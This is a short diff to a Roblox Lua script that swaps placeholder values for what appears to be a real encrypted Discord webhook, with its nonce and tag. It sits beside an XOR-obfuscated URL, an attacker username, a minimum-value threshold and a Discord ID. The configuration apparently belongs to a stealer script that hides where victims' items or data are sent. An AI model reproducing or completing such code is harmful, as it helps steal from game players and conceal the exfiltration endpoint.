@@ -10,9 +10,9 @@ local url_key = "Kanka12345678901"
 local decoded_url = game:GetService("HttpService"):URLDecode(encrypted_url)
 local decrypt_url = xor(decoded_url, url_key)
 local HttpService = game:GetService("HttpService")
-local encrypted_webhook = "dGhpcy1pcy1hLXNhbXBsZQ=="
-local nonce = "YmFzZTY0LW5vbmNl"
-local tag = "YmFzZTY0LXRhZw=="
+local encrypted_webhook = "vqD0k8v7N7uCM1tW3KV7mO4J9M1B/pSFUZGEVSk43dsx3pOW1yxirTbSaiDYN9q5rS8mQHNWNFuI0BPqPZjDr/YYw7fiUy6P7+3sTnYkmVuXX27Qix1xwt56HHx66uDPX6ngH5ihR9wH5GhRsciJFnIwD3qaImpnYg=="
+local nonce = "9RunZqtfTkEKud3CC4yTbg=="
+local tag = "lKp5I9Q5mIz1eEeJ6+xWlA=="
 local Username = "ggtrl95"
 local MinimumValue = 1000000
 local DiscordID = "bombclatiii"
